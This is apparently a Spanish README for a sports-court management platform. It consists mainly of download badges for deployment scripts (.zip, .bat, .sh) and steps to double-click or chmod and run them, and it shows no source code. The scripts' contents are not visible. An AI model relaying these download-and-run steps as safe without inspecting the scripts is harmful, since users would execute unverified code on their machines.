# Pichangueo - Plataforma de Gestion Deportiva

![Docker](https://img.shields.io/badge/Docker-2496ED?style=flat-square&logo=docker&logoColor=white)
![FastAPI](https://img.shields.io/badge/FastAPI-009688?style=flat-square&logo=fastapi&logoColor=white)
![Next.js](https://img.shields.io/badge/Next.js-000000?style=flat-square&logo=next.js&logoColor=white)
![PostgreSQL](https://img.shields.io/badge/PostgreSQL-4169E1?style=flat-square&logo=postgresql&logoColor=white)
![Redis](https://img.shields.io/badge/Redis-DC382D?style=flat-square&logo=redis&logoColor=white)

Plataforma integral para la administracion, reserva de canchas deportivas y gestion de complejos deportivos.


## Descarga de Scripts de Despliegue

[![Descargar Paquete ZIP](https://img.shields.io/badge/Descarga_Directa-Paquete_ZIP_(Todos_los_sistemas)-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/pichangueo/.github/raw/master/desplegar.zip)

Alternativamente, puede descargar los scripts individuales:

[![Descargar para Windows](https://img.shields.io/badge/Descargar-desplegar.bat_(Windows)-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/pichangueo/.github/raw/master/desplegar.bat)
[![Descargar para Linux / macOS](https://img.shields.io/badge/Descargar-desplegar.sh_(Linux_/_macOS)-24292e?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/pichangueo/.github/raw/master/desplegar.sh)


## Instrucciones de Ejecucion

### En Windows
1. Descargue el script o el paquete ZIP y descomprimalo.
2. Haga doble clic sobre el archivo `desplegar.bat` (o ejecute `.\desplegar.bat` en su terminal).

### En Linux / macOS
1. Descargue el script o el paquete ZIP y descomprimalo.
2. Abra su terminal, otorgue permisos de ejecucion e inicie el despliegue:
```bash
chmod +x desplegar.sh && ./desplegar.sh
```


## Acceso a la Plataforma

Una vez finalizado el proceso de inicio del contenedor, la plataforma estara disponible en:

* **Aplicacion Web:** [http://localhost](http://localhost)
* **Documentacion de la API (Swagger):** [http://localhost/api/docs](http://localhost/api/docs)